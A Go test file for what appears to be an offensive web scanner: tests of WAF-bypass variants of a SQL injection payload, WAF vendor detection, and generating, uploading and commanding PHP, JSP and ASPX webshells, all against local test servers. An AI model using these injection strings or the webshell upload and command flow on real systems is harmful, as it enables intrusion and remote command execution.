package scanner

import (
	"context"
	"encoding/base64"
	"errors"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

func TestBuildBypassVariants(t *testing.T) {
	variants := BuildBypassVariants("/api/query", "id", "' or 1=1--")
	if len(variants) < 10 {
		t.Fatalf("too few variants: %d", len(variants))
	}
	byName := map[string]BypassVariant{}
	for _, v := range variants {
		byName[v.Name] = v
	}
	if byName["baseline"].Path != "/api/query?id=%27+or+1%3D1--" {
		t.Fatalf("baseline path: %s", byName["baseline"].Path)
	}
	if !strings.Contains(byName["doubleencode"].Path, "%2527") {
		t.Fatalf("double encode missing: %s", byName["doubleencode"].Path)
	}
	if !strings.Contains(byName["nullbyte"].Path, "%00") {
		t.Fatalf("null byte missing: %s", byName["nullbyte"].Path)
	}
	if byName["xff"].Headers["X-Forwarded-For"] != "127.0.0.1" {
		t.Fatalf("xff header missing: %+v", byName["xff"].Headers)
	}
	if byName["post"].Method != http.MethodPost || byName["post"].Body == "" {
		t.Fatalf("post variant invalid: %+v", byName["post"])
	}
}

func TestBuildBypassVariantsEmptyParam(t *testing.T) {
	// 空参数名：载荷没有可挂载的名字。基线只保留原路径，其余变形一律标
	// unsupported，且不能留下 `?=` 这种看起来像发过的请求。
	variants := BuildBypassVariants("/api/query", "  ", "' or 1=1--")
	if variants[0].Name != "baseline" || variants[0].SkipReason != "" {
		t.Fatalf("baseline must stay sendable: %+v", variants[0])
	}
	if variants[0].Path != "/api/query" {
		t.Fatalf("empty-param baseline path: %s", variants[0].Path)
	}
	for _, v := range variants[1:] {
		if v.SkipReason == "" {
			t.Fatalf("%s 未标记 unsupported: %+v", v.Name, v)
		}
		if strings.Contains(v.Path, "?") || strings.Contains(v.Path, "=") {
			t.Fatalf("%s 仍带载荷查询串: %s", v.Name, v.Path)
		}
		if v.Body != "" {
			t.Fatalf("%s 仍带请求体: %q", v.Name, v.Body)
		}
	}
}

func TestRunBypassProbesEmptyParamSendsBaselineOnly(t *testing.T) {
	var hits int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		atomic.AddInt32(&hits, 1)
		w.WriteHeader(200)
		_, _ = w.Write([]byte("hello"))
	}))
	defer srv.Close()

	variants := BuildBypassVariants("/api/query", "", "union")
	run := RunBypassProbes(context.Background(), NewDeepClient(5*time.Second), srv.URL, variants, []string{"union select ok"}, DefaultBypassConfig())

	if got := atomic.LoadInt32(&hits); got != 1 {
		t.Fatalf("只有基线应发包，实际 %d 次", got)
	}
	if run.Attempts != 1 {
		t.Fatalf("attempts should count only sent requests: %d", run.Attempts)
	}
	if run.StopReason != "no_attack_variant" {
		t.Fatalf("stop reason: %q", run.StopReason)
	}
	if run.FinalVerdict != "no_bypass" {
		t.Fatalf("final verdict: %q", run.FinalVerdict)
	}
	unsupported := 0
	for _, p := range run.Probes {
		if p.Verdict != "unsupported" {
			continue
		}
		unsupported++
		if p.Note == "" || p.Attempt != 0 {
			t.Fatalf("unsupported probe must explain itself and carry no attempt number: %+v", p)
		}
	}
	if unsupported != len(variants)-1 {
		t.Fatalf("unsupported probes: got %d want %d", unsupported, len(variants)-1)
	}
}

func TestBuildShellPayload(t *testing.T) {
	php, err := BuildShellPayload("php", "s3cr3t")
	if err != nil {
		t.Fatalf("php payload: %v", err)
	}
	if !strings.Contains(php.Content, "s3cr3t") || php.Filename != "shell.php" {
		t.Fatalf("php payload: %+v", php)
	}
	if php.SHA256 == "" {
		t.Fatal("legacy payload should carry a SHA-256 fingerprint")
	}
	jsp, err := BuildShellPayload("jsp", "s3cr3t")
	if err != nil {
		t.Fatalf("jsp payload: %v", err)
	}
	if !strings.Contains(jsp.Content, "s3cr3t") || !strings.Contains(jsp.Content, "Runtime.getRuntime") {
		t.Fatalf("jsp payload: %+v", jsp)
	}
	if !strings.Contains(jsp.Content, "cmd.exe") || !strings.Contains(jsp.Content, "/bin/sh") {
		t.Fatalf("jsp payload should support Windows and POSIX: %+v", jsp)
	}
	aspx, err := BuildShellPayload("aspx", "s3cr3t")
	if err != nil {
		t.Fatalf("aspx payload: %v", err)
	}
	if !strings.Contains(aspx.Content, "s3cr3t") || !strings.Contains(aspx.Content, "Process") {
		t.Fatalf("aspx payload: %+v", aspx)
	}
	if !strings.Contains(aspx.Content, "cmd.exe") || strings.Contains(aspx.Content, "FileName = \"/bin/sh\";") {
		t.Fatalf("aspx payload still hardcodes /bin/sh: %+v", aspx)
	}
	if _, err := BuildShellPayload("php", "  "); err == nil {
		t.Fatal("empty legacy password must be rejected, not defaulted")
	}
}

func TestUploadWebshellMultipart(t *testing.T) {
	var gotName, gotBody string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if err := r.ParseMultipartForm(1 << 20); err != nil {
			t.Errorf("parse multipart: %v", err)
			w.WriteHeader(400)
			return
		}
		f, fh, err := r.FormFile("file")
		if err != nil {
			t.Errorf("form file: %v", err)
			w.WriteHeader(400)
			return
		}
		defer f.Close()
		gotName = fh.Filename
		b, _ := io.ReadAll(f)
		gotBody = string(b)
		w.WriteHeader(200)
		_, _ = w.Write([]byte("ok"))
	}))
	defer srv.Close()

	payload, err := BuildShellPayload("php", "pw")
	if err != nil {
		t.Fatalf("payload: %v", err)
	}
	res := UploadWebshell(context.Background(), NewDeepClient(5*time.Second), srv.URL, "file", payload.Filename, []byte(payload.Content), map[string]string{"dir": "/upload"}, nil)
	if !res.Success || res.StatusCode != 200 {
		t.Fatalf("upload failed: %+v", res)
	}
	if gotName != "shell.php" || !strings.Contains(gotBody, "pw") {
		t.Fatalf("upload content: name=%q body=%q", gotName, gotBody)
	}
}

func TestNormalizeUploadURL(t *testing.T) {
	cases := map[string]string{
		"http://host:10800":           "http://host:10800/",
		"http://host:10800/":          "http://host:10800/",
		"http://host:10800/upload/":   "http://host:10800/upload/",
		"https://host/upload.php?d=1": "https://host/upload.php?d=1",
		"  http://host  ":             "http://host/",
	}
	for in, want := range cases {
		if got := normalizeUploadURL(in); got != want {
			t.Errorf("normalizeUploadURL(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestWebshellCommandRoundTrip(t *testing.T) {
	payload, err := BuildShellPayload("php", "pw")
	if err != nil {
		t.Fatalf("payload: %v", err)
	}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_ = r.ParseForm()
		cmd := r.PostFormValue("pw")
		const prefix, suffix = "@system(base64_decode('", "'));"
		if strings.HasPrefix(cmd, prefix) && strings.HasSuffix(cmd, suffix) {
			if raw, err := base64.StdEncoding.DecodeString(strings.TrimSuffix(strings.TrimPrefix(cmd, prefix), suffix)); err == nil {
				cmd = string(raw)
			}
		}
		w.WriteHeader(200)
		_, _ = w.Write([]byte("out:" + cmd))
	}))
	defer srv.Close()

	out, err := RunShellCommand(context.Background(), NewDeepClient(5*time.Second), srv.URL, payload, "id")
	if err != nil {
		t.Fatalf("run command: %v", err)
	}
	if !strings.Contains(out, "out:id") {
		t.Fatalf("command output: %q", out)
	}
	alive, note := CheckShellAlive(context.Background(), NewDeepClient(5*time.Second), srv.URL, payload)
	if !alive {
		t.Fatalf("shell not alive: %s", note)
	}
}

// The webshell terminal reports "we stopped waiting, the target may still be
// working" only if it can tell a client deadline from a refused connection, and
// it reads that with errors.Is/errors.As. Flattening the transport error to a
// string in DeepResponse took the cause away, so the wait looked like a crash.
func TestRunShellCommandKeepsDeadlineCause(t *testing.T) {
	mk := func(tb testing.TB, protocol string) ShellPayload {
		tb.Helper()
		if protocol == ShellProtocolV2 {
			p, err := BuildShellPayloadV2("php", []byte("0123456789abcdef0123456789abcdef"), "tplRender")
			if err != nil {
				tb.Fatalf("v2 payload: %v", err)
			}
			return p
		}
		p, err := BuildShellPayload("php", "pw")
		if err != nil {
			tb.Fatalf("v1 payload: %v", err)
		}
		return p
	}
	for _, protocol := range []string{ShellProtocolLegacy, ShellProtocolV2} {
		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			time.Sleep(400 * time.Millisecond)
			_, _ = w.Write([]byte("late"))
		}))
		_, err := RunShellCommand(context.Background(), NewDeepClient(60*time.Millisecond), srv.URL, mk(t, protocol), "sleep 5")
		srv.Close()
		if err == nil {
			t.Fatalf("%s: expected deadline error", protocol)
		}
		if !errors.Is(err, context.DeadlineExceeded) {
			t.Fatalf("%s: cause lost, errors.Is(DeadlineExceeded) false for %v", protocol, err)
		}
		var netErr net.Error
		if !errors.As(err, &netErr) || !netErr.Timeout() {
			t.Fatalf("%s: not a net.Error timeout: %v", protocol, err)
		}
	}
}

func TestDetectWAF(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.Contains(r.URL.RawQuery, "jw_probe") {
			w.Header().Set("Server", "cloudflare")
			w.WriteHeader(403)
			_, _ = w.Write([]byte("<h1>Access denied</h1>"))
			return
		}
		w.Header().Set("CF-RAY", "abc123")
		w.WriteHeader(200)
		_, _ = w.Write([]byte("<html>ok</html>"))
	}))
	defer srv.Close()

	det := DetectWAF(context.Background(), NewDeepClient(5*time.Second), srv.URL)
	if !det.Detected {
		t.Fatalf("waf not detected: %+v", det)
	}
	if det.Vendor != "Cloudflare" {
		t.Fatalf("waf vendor: %q", det.Vendor)
	}
	if !det.Blocked {
		t.Fatalf("probe not blocked: %+v", det)
	}
}

func TestRunBypassProbesFirstShotPasses(t *testing.T) {
	// 无 WAF：所有请求都返回 200 并带关键词 → 基线即命中，第一发就停。
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(200)
		_, _ = w.Write([]byte("data: union select ok"))
	}))
	defer srv.Close()
	variants := BuildBypassVariants("/api", "q", "union")
	run := RunBypassProbes(context.Background(), NewDeepClient(5*time.Second), srv.URL, variants, []string{"union select ok"}, DefaultBypassConfig())
	if run.FinalVerdict != "bypassed" {
		t.Fatalf("final verdict: %q", run.FinalVerdict)
	}
	if run.Attempts != 1 {
		t.Fatalf("should stop at baseline when it already bypasses, attempts=%d", run.Attempts)
	}
	if run.StopReason != "bypass_found" {
		t.Fatalf("stop reason: %q", run.StopReason)
	}
	if run.BaselineBlocked {
		t.Fatal("baseline should not be blocked")
	}
	if run.Probes[0].Attempt != 1 {
		t.Fatalf("probe attempt: %d", run.Probes[0].Attempt)
	}
}

func TestRunBypassProbesBypassAfterBlocks(t *testing.T) {
	// 只有基线被拦，其余变形放行 → 被拦后第 n 发命中，不再按构造顺序盲发。
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/api" && r.URL.RawQuery == "q=union" {
			w.WriteHeader(403)
			_, _ = w.Write([]byte("blocked by WAF"))
			return
		}
		w.WriteHeader(200)
		_, _ = w.Write([]byte("data: union select ok"))
	}))
	defer srv.Close()
	variants := BuildBypassVariants("/api", "q", "union")
	run := RunBypassProbes(context.Background(), NewDeepClient(5*time.Second), srv.URL, variants, []string{"union select ok"}, DefaultBypassConfig())
	if run.FinalVerdict != "bypassed" {
		t.Fatalf("final verdict: %q", run.FinalVerdict)
	}
	if !run.BaselineBlocked {
		t.Fatal("baseline should be blocked")
	}
	if run.Attempts < 2 {
		t.Fatalf("should need at least 2 attempts to bypass after block, got %d", run.Attempts)
	}
	if run.StopReason != "bypass_found" {
		t.Fatalf("stop reason: %q", run.StopReason)
	}
	if run.BlockFeature == "" {
		t.Fatal("block feature should be inferred from baseline")
	}
	sawBlockFirst, foundBypass := false, false
	for _, p := range run.Probes {
		if p.Attempt == 1 {
			sawBlockFirst = p.Verdict == "blocked"
		}
		if p.Verdict == "bypassed" {
			foundBypass = true
		}
	}
	if !sawBlockFirst || !foundBypass {
		t.Fatalf("expected block-then-bypass, run=%+v", run)
	}
}

func TestRunBypassProbesAllBlocked(t *testing.T) {
	// 所有变形都被拦 → 连续被拦止损，预算内全部被拦，不无限重发。
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(403)
		_, _ = w.Write([]byte("blocked by WAF"))
	}))
	defer srv.Close()
	cfg := DefaultBypassConfig()
	variants := BuildBypassVariants("/api", "q", "union")
	run := RunBypassProbes(context.Background(), NewDeepClient(5*time.Second), srv.URL, variants, []string{"union select ok"}, cfg)
	if run.FinalVerdict != "no_bypass" {
		t.Fatalf("final verdict: %q", run.FinalVerdict)
	}
	if !run.BaselineBlocked {
		t.Fatal("baseline should be blocked")
	}
	if run.StopReason != "consecutive_blocked" {
		t.Fatalf("stop reason: %q (attempts=%d)", run.StopReason, run.Attempts)
	}
	if run.Attempts != cfg.MaxConsecutiveBlocked {
		t.Fatalf("should stop at the consecutive-block limit, attempts=%d want %d", run.Attempts, cfg.MaxConsecutiveBlocked)
	}
	for _, p := range run.Probes {
		if p.Verdict == "bypassed" {
			t.Fatal("no variant should bypass a fully blocking target")
		}
	}
}

func TestRunBypassProbesBudgetCap(t *testing.T) {
	// 所有请求都放行但不命中关键词（passed）→ 没有绕过也没有被拦，靠预算上限收口。
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(200)
		_, _ = w.Write([]byte("hello"))
	}))
	defer srv.Close()
	cfg := DefaultBypassConfig()
	variants := BuildBypassVariants("/api", "q", "union")
	if len(variants) <= cfg.MaxAttempts {
		t.Fatalf("need more variants than budget to test the cap, got %d", len(variants))
	}
	run := RunBypassProbes(context.Background(), NewDeepClient(5*time.Second), srv.URL, variants, []string{"union select ok"}, cfg)
	if run.FinalVerdict != "no_bypass" {
		t.Fatalf("final verdict: %q", run.FinalVerdict)
	}
	if run.Attempts != cfg.MaxAttempts {
		t.Fatalf("attempts should be capped at MaxAttempts=%d, got %d", cfg.MaxAttempts, run.Attempts)
	}
	if run.StopReason != "budget_exhausted" {
		t.Fatalf("stop reason: %q", run.StopReason)
	}
}

func TestRunBypassProbesConsecutiveErrors(t *testing.T) {
	// 目标不可达（端口拒绝）→ 连续传输错误止损，不无限重发。
	variants := BuildBypassVariants("/api", "q", "union")
	cfg := DefaultBypassConfig()
	run := RunBypassProbes(context.Background(), NewDeepClient(200*time.Millisecond), "http://127.0.0.1:1/", variants, []string{"x"}, cfg)
	if run.StopReason != "consecutive_errors" {
		t.Fatalf("stop reason: %q (attempts=%d)", run.StopReason, run.Attempts)
	}
	if run.Attempts != cfg.MaxConsecutiveErrors {
		t.Fatalf("attempts should stop at consecutive-error limit, got %d want %d", run.Attempts, cfg.MaxConsecutiveErrors)
	}
}

func TestClassifyBlockFeature(t *testing.T) {
	cases := []struct {
		name string
		resp DeepResponse
		want BlockFeature
	}{
		{"429", DeepResponse{StatusCode: 429}, BlockRateLimit},
		{"503 retry-after", DeepResponse{StatusCode: 503, Headers: http.Header{"Retry-After": []string{"2"}}}, BlockRateLimit},
		{"captcha body", DeepResponse{StatusCode: 403, Body: "请输入验证码"}, BlockRateLimit},
		{"vendor body", DeepResponse{StatusCode: 403, Body: "安全狗拦截"}, BlockVendor},
		{"bare 403", DeepResponse{StatusCode: 403, Body: "forbidden"}, BlockRule},
		{"401", DeepResponse{StatusCode: 401}, BlockRule},
	}
	for _, c := range cases {
		if got := classifyBlockFeature(c.resp); got != c.want {
			t.Errorf("%s: classify = %v, want %v", c.name, got, c.want)
		}
	}
}

func TestReorderByFeature(t *testing.T) {
	variants := BuildBypassVariants("/api", "q", "union")
	// 基线恒在第一位；规则类场景里路径变形排到最先。
	order := reorderByFeature(variants, 0, BlockRule)
	if order[0].Name != "baseline" {
		t.Fatalf("baseline must stay first, got %q", order[0].Name)
	}
	prio := []string{"path", "header", "encoding", "method"}
	lastRank := -1
	seen := map[string]bool{}
	for _, v := range order[1:] {
		r := len(prio)
		for i, p := range prio {
			if p == v.Category {
				r = i
			}
		}
		if r < lastRank {
			t.Fatalf("reorder not monotonic by category: %q after rank %d", v.Category, lastRank)
		}
		lastRank = r
		if seen[v.Name] {
			t.Fatalf("duplicate variant after reorder: %q", v.Name)
		}
		seen[v.Name] = true
	}
	if len(seen) != len(variants)-1 {
		t.Fatalf("reorder dropped or added variants: got %d want %d", len(seen), len(variants)-1)
	}
}

func TestBypassConfigClamp(t *testing.T) {
	// 硬上限：无论调用方传多大，尝试次数都被封顶。
	got := BypassConfig{MaxAttempts: 9999}.clamp()
	if got.MaxAttempts != bypassHardCap {
		t.Fatalf("hard cap not applied: %d", got.MaxAttempts)
	}
	// 零/负值回退默认；连续阈值同样有下限。
	got = BypassConfig{MaxAttempts: 0, MaxConsecutiveBlocked: 0, MaxConsecutiveErrors: 0}.clamp()
	if got.MaxAttempts != DefaultBypassConfig().MaxAttempts {
		t.Fatalf("zero MaxAttempts not defaulted: %d", got.MaxAttempts)
	}
	if got.MaxConsecutiveBlocked != DefaultBypassConfig().MaxConsecutiveBlocked {
		t.Fatalf("zero MaxConsecutiveBlocked not defaulted: %d", got.MaxConsecutiveBlocked)
	}
	if got.MaxConsecutiveErrors != DefaultBypassConfig().MaxConsecutiveErrors {
		t.Fatalf("zero MaxConsecutiveErrors not defaulted: %d", got.MaxConsecutiveErrors)
	}
	// 模式：空或乱值回落自适应，full 保留。
	if got.Mode != BypassModeAdaptive {
		t.Fatalf("empty mode not defaulted to adaptive: %q", got.Mode)
	}
	if got = (BypassConfig{Mode: "nonsense"}).clamp(); got.Mode != BypassModeAdaptive {
		t.Fatalf("unknown mode must fall back to adaptive: %q", got.Mode)
	}
	if got = (BypassConfig{Mode: BypassModeFull}).clamp(); got.Mode != BypassModeFull {
		t.Fatalf("full mode lost in clamp: %q", got.Mode)
	}
}

func TestRunBypassProbesFullMode(t *testing.T) {
	// 全量模式：全部被拦也不触发连续止损、不做特征重排，按构造顺序发到预算耗尽。
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(403)
		_, _ = w.Write([]byte("blocked by WAF"))
	}))
	defer srv.Close()
	cfg := DefaultBypassConfig()
	cfg.Mode = BypassModeFull
	variants := BuildBypassVariants("/api", "q", "union")
	run := RunBypassProbes(context.Background(), NewDeepClient(5*time.Second), srv.URL, variants, []string{"union select ok"}, cfg)
	if run.Mode != BypassModeFull {
		t.Fatalf("effective mode not recorded: %q", run.Mode)
	}
	if run.StopReason != "budget_exhausted" {
		t.Fatalf("full mode must run until the budget, stop=%q attempts=%d", run.StopReason, run.Attempts)
	}
	if run.Attempts != cfg.MaxAttempts {
		t.Fatalf("full mode attempts: got %d want %d", run.Attempts, cfg.MaxAttempts)
	}
	if run.BlockFeature != "" {
		t.Fatalf("full mode must not classify/reorder, block_feature=%q", run.BlockFeature)
	}
	// 构造顺序原样保留：第二发必须是 case。
	if run.Probes[1].Name != "case" {
		t.Fatalf("full mode must keep build order, probe[1]=%q", run.Probes[1].Name)
	}
	for _, p := range run.Probes {
		if p.Verdict != "blocked" {
			t.Fatalf("expected all blocked, got %q for %s", p.Verdict, p.Name)
		}
	}
}
